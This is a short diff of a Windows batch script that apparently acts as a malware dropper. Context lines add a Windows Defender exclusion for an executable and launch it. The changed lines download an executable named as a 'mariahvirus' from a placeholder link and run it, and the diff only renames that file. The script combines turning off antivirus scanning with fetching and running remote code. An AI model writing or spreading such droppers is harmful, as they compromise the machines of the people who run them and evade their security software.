@@ -18,5 +18,5 @@ Powershell -Command "Add-MpPreference -ExclusionPath 'C:\flappygame.exe'"
 start C:\flappygame.exe
 cd %TEMP%
 Powershell -Command "Invoke-WebRequest -Uri 'link_to_aiwfciy_mp3' -OutFile aiwfciy.mp3"
-Powershell -Command "Invoke-WebRequest -Uri 'link_to_mariahvirus_exe' -OutFile .\mariahpocalypsequicker.exe"
-mariahpocalypsequicker.exe
+Powershell -Command "Invoke-WebRequest -Uri 'link_to_mariahvirus_exe' -OutFile .\mariahpocalypse.exe"
+mariahpocalypse.exe
